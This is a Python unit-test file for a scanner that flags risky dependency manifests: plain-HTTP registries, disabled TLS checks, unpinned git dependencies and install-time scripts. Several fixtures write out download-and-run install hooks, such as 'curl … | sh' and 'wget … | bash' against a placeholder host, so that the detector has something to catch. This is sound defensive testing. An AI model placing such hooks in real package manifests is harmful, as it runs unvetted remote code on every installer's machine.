"""Dependency manifests: where the rest of the build comes from."""

import unittest

from repo_sentinel.findings import Severity
from repo_sentinel.scanners import dependencies


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def scan(path, text):
    return dependencies.scan_manifest(path, text)


class TestRecognition(unittest.TestCase):
    def test_the_manifests_people_actually_have(self):
        for path in (
            "package.json",
            "web/.npmrc",
            "requirements.txt",
            "requirements-dev.txt",
            "Gemfile",
            "pom.xml",
        ):
            with self.subTest(path=path):
                self.assertIsNotNone(dependencies.manifest_kind(path))

    def test_everything_else_is_left_alone(self):
        for path in ("src/main.py", "package-lock.json", "README.md"):
            with self.subTest(path=path):
                self.assertIsNone(dependencies.manifest_kind(path))


class TestPlaintextSources(unittest.TestCase):
    def test_an_http_registry(self):
        findings = scan(".npmrc", "registry=http://registry.internal/\n")
        self.assertEqual(findings[0].rule_id, "SC001")
        self.assertEqual(findings[0].severity, Severity.HIGH)

    def test_an_http_index_url(self):
        self.assertIn("SC001", rule_ids(scan("pip.conf", "index-url = http://pypi.internal/simple\n")))

    def test_a_gem_source_and_a_maven_repository(self):
        self.assertIn("SC001", rule_ids(scan("Gemfile", "source 'http://gems.internal'\n")))
        self.assertIn(
            "SC001",
            rule_ids(scan("pom.xml", "<repository><url>http://repo.internal</url></repository>\n")),
        )

    def test_https_is_the_point_and_is_not_reported(self):
        self.assertEqual(scan(".npmrc", "registry=https://registry.npmjs.org/\n"), [])

    def test_a_loopback_registry_is_a_development_detail(self):
        for host in ("localhost:4873", "127.0.0.1:8080"):
            with self.subTest(host=host):
                self.assertEqual(scan(".npmrc", f"registry=http://{host}/\n"), [])

    def test_a_link_that_is_not_a_source_is_not_a_supply_chain(self):
        # A licence URL in a Gemfile comment is not where packages come from.
        self.assertEqual(scan("Gemfile", "# see http://example.invalid/licence\n"), [])

    def test_each_host_is_reported_once(self):
        text = "registry=http://registry.internal/\n@acme:registry=http://registry.internal/\n"
        self.assertEqual(len(scan(".npmrc", text)), 1)


class TestJsonManifestSources(unittest.TestCase):
    """In a JSON manifest the field is available, so the field decides."""

    def test_repository_metadata_is_not_a_package_source(self):
        # npm has never downloaded anything from "repository". This was a
        # false positive fourteen times over in one repository.
        text = (
            '{\n  "name": "app",\n'
            '  "repository": {"type": "git", "url": "http://github.invalid/acme/app.git"},\n'
            '  "homepage": "http://acme.invalid",\n'
            '  "bugs": {"url": "http://acme.invalid/issues"}\n}'
        )
        self.assertEqual(scan("package.json", text), [])

    def test_a_publish_registry_is_a_package_source(self):
        text = '{\n  "name": "app",\n  "publishConfig": {"registry": "http://registry.internal/"}\n}'
        findings = scan("package.json", text)
        self.assertEqual(findings[0].rule_id, "SC001")
        self.assertEqual(findings[0].line, 3)

    def test_composer_repositories_are_package_sources(self):
        text = '{\n  "repositories": [\n    {"type": "composer", "url": "http://packages.internal"}\n  ]\n}'
        self.assertIn("SC001", rule_ids(scan("composer.json", text)))

    def test_https_sources_are_fine(self):
        text = '{\n  "publishConfig": {"registry": "https://registry.npmjs.org/"}\n}'
        self.assertEqual(scan("package.json", text), [])


class TestVerification(unittest.TestCase):
    def test_the_several_ways_to_switch_it_off(self):
        for path, line in (
            (".npmrc", "strict-ssl=false"),
            ("pip.conf", "[global]\ntrusted-host = pypi.internal"),
            ("requirements.txt", "--trusted-host pypi.internal"),
        ):
            with self.subTest(line=line):
                findings = scan(path, line + "\n")
                self.assertIn("SC004", rule_ids(findings))

    def test_an_ordinary_manifest_is_quiet(self):
        self.assertEqual(scan(".npmrc", "ignore-scripts=true\n"), [])


class TestInstallScripts(unittest.TestCase):
    def package(self, scripts):
        return '{\n  "name": "app",\n  "scripts": {\n' + scripts + "\n  }\n}\n"

    def test_a_lifecycle_script_that_downloads_and_runs(self):
        text = self.package('    "postinstall": "curl -sSL https://x.invalid/i.sh | sh"')
        findings = scan("package.json", text)
        self.assertEqual(findings[0].rule_id, "SC002")
        self.assertIn("postinstall", findings[0].title)

    def test_every_script_npm_runs_without_being_asked(self):
        for name in ("preinstall", "install", "postinstall", "prepare"):
            with self.subTest(name=name):
                text = self.package(f'    "{name}": "wget -qO- https://x.invalid/i.sh | bash"')
                self.assertIn("SC002", rule_ids(scan("package.json", text)))

    def test_the_same_command_in_build_is_a_different_proposition(self):
        # npm install does not run "build". Somebody chose to run it.
        text = self.package('    "build": "curl -sSL https://x.invalid/b.sh | sh"')
        self.assertEqual(scan("package.json", text), [])

    def test_an_ordinary_install_script_is_fine(self):
        text = self.package('    "postinstall": "node scripts/setup.js"')
        self.assertEqual(scan("package.json", text), [])

    def test_malformed_json_is_not_a_crash(self):
        self.assertEqual(scan("package.json", "{ not json"), [])


class TestComposer(unittest.TestCase):
    """PHP's manifest, which runs scripts on install exactly as npm does."""

    def test_a_composer_lifecycle_script(self):
        text = '{\n  "scripts": {\n    "post-install-cmd": "curl -s https://x.invalid/i.sh | sh"\n  }\n}'
        self.assertIn("SC002", rule_ids(scan("composer.json", text)))

    def test_composer_writes_scripts_as_lists_too(self):
        text = (
            '{\n  "scripts": {\n    "post-install-cmd": [\n      "php artisan clear",\n'
            '      "wget -qO- https://x.invalid/i.sh | bash"\n    ]\n  }\n}'
        )
        findings = scan("composer.json", text)
        self.assertIn("SC002", rule_ids(findings))
        self.assertEqual(findings[0].line, 5)

    def test_a_require_on_a_branch(self):
        text = '{\n  "require": {\n    "acme/lib": "git+https://x.invalid/acme/lib.git"\n  }\n}'
        self.assertIn("SC003", rule_ids(scan("composer.json", text)))

    def test_an_ordinary_composer_file_is_quiet(self):
        text = '{\n  "require": {\n    "monolog/monolog": "^3.0"\n  }\n}'
        self.assertEqual(scan("composer.json", text), [])


class TestSourceDependencies(unittest.TestCase):
    def package(self, dependencies_block):
        return '{\n  "name": "app",\n  "dependencies": {\n' + dependencies_block + "\n  }\n}\n"

    def test_a_dependency_on_a_branch(self):
        text = self.package('    "lib": "git+https://github.invalid/acme/lib.git"')
        findings = scan("package.json", text)
        self.assertEqual(findings[0].rule_id, "SC003")
        self.assertEqual(findings[0].severity, Severity.MEDIUM)

    def test_a_commit_is_a_pin(self):
        text = self.package('    "lib": "git+https://github.invalid/acme/lib.git#3f2a1b8c9d0e4f5a6b7c8d9e0f1a2b3c4d5e6f70"')
        self.assertEqual(scan("package.json", text), [])

    def test_a_version_range_is_not_a_place(self):
        self.assertEqual(scan("package.json", self.package('    "left-pad": "^1.3.0"')), [])

    def test_a_requirement_url_with_no_hash(self):
        self.assertIn("SC003", rule_ids(scan("requirements.txt", "https://x.invalid/pkg.tar.gz\n")))

    def test_a_hash_settles_it(self):
        self.assertEqual(
            scan("requirements.txt", "https://x.invalid/pkg.tar.gz#sha256=abc123\n"), []
        )

    def test_pip_pins_with_an_at_before_its_egg_fragment(self):
        # git+https://host/a/b.git@v1.2.3#egg=b is pinned; the ref is not last.
        for line in (
            "git+https://x.invalid/a/b.git@v1.2.3#egg=b",
            "git+https://x.invalid/a/b.git@3f2a1b8c9d0e4f5a6b7c8d9e0f1a2b3c4d5e6f70#egg=b",
        ):
            with self.subTest(line=line):
                self.assertEqual(scan("requirements.txt", line + "\n"), [])

    def test_a_branch_is_not_a_pin(self):
        self.assertIn(
            "SC003", rule_ids(scan("requirements.txt", "git+https://x.invalid/a/b.git@main#egg=b\n"))
        )

    def test_an_ordinary_requirement_is_quiet(self):
        self.assertEqual(scan("requirements.txt", "requests==2.31.0\n# a comment\n\n"), [])


class TestTomlManifests(unittest.TestCase):
    """pyproject.toml and Cargo.toml, read by table rather than by line."""

    def test_both_are_recognised(self):
        self.assertEqual(dependencies.manifest_kind("pyproject.toml"), "pip")
        self.assertEqual(dependencies.manifest_kind("Cargo.toml"), "cargo")

    def test_a_source_table_over_plain_http(self):
        text = (
            "[[tool.poetry.source]]\nname = \"internal\"\n"
            'url = "http://packages.internal/simple"\n'
        )
        findings = scan("pyproject.toml", text)
        self.assertIn("SC001", rule_ids(findings))
        self.assertIn("packages.internal", findings[0].title)

    def test_a_cargo_registry_over_plain_http(self):
        text = '[source.mirror]\nregistry = "http://crates.internal/index"\n'
        self.assertIn("SC001", rule_ids(scan("Cargo.toml", text)))

    def test_project_metadata_is_not_a_package_source(self):
        # The npm manifest taught this lesson: a homepage is not a supply
        # chain, and reporting one is a false positive per project.
        text = (
            "[project.urls]\n"
            'Homepage = "http://example.invalid/billing"\n'
            'Repository = "http://github.com/acme/billing"\n'
        )
        self.assertEqual(scan("pyproject.toml", text), [])

    def test_an_inline_git_dependency_with_a_branch(self):
        text = (
            "[tool.poetry.dependencies]\n"
            'shared = { git = "https://github.com/acme/shared.git", branch = "main" }\n'
        )
        findings = [f for f in scan("pyproject.toml", text) if f.rule_id == "SC003"]
        self.assertEqual(len(findings), 1)
        self.assertIn("'shared'", findings[0].title)

    def test_an_inline_git_dependency_pinned_to_a_revision(self):
        text = (
            "[dependencies]\n"
            'pinned = { git = "https://github.com/acme/pinned", rev = "abc1234" }\n'
        )
        self.assertNotIn("SC003", rule_ids(scan("Cargo.toml", text)))

    def test_a_git_dependency_spread_over_a_table(self):
        text = "[dependencies.other]\ngit = \"https://github.com/acme/other\"\n"
        findings = [f for f in scan("Cargo.toml", text) if f.rule_id == "SC003"]
        self.assertEqual(len(findings), 1)
        self.assertIn("'other'", findings[0].title)

    def test_a_tagged_table_dependency_is_pinned_enough(self):
        text = (
            "[dependencies.pinned]\n"
            'git = "https://github.com/acme/pinned"\ntag = "v1.2.3"\n'
        )
        self.assertNotIn("SC003", rule_ids(scan("Cargo.toml", text)))

    def test_an_ordinary_version_dependency_says_nothing(self):
        text = '[dependencies]\nserde = "1.0"\ntokio = { version = "1", features = ["full"] }\n'
        self.assertEqual(scan("Cargo.toml", text), [])

    def test_a_marker_still_silences_a_line(self):
        text = (
            "[source.mirror]\n"
            'registry = "http://crates.internal/index"  # repo-sentinel: ignore\n'
        )
        self.assertEqual(scan("Cargo.toml", text), [])


class TestSuppression(unittest.TestCase):
    def test_line_marker(self):
        text = "registry=http://registry.internal/  # repo-sentinel: ignore\n"
        self.assertEqual(scan(".npmrc", text), [])

    def test_file_marker(self):
        text = "# repo-sentinel: ignore-file\nregistry=http://registry.internal/\n"
        self.assertEqual(scan(".npmrc", text), [])


if __name__ == "__main__":
    unittest.main()
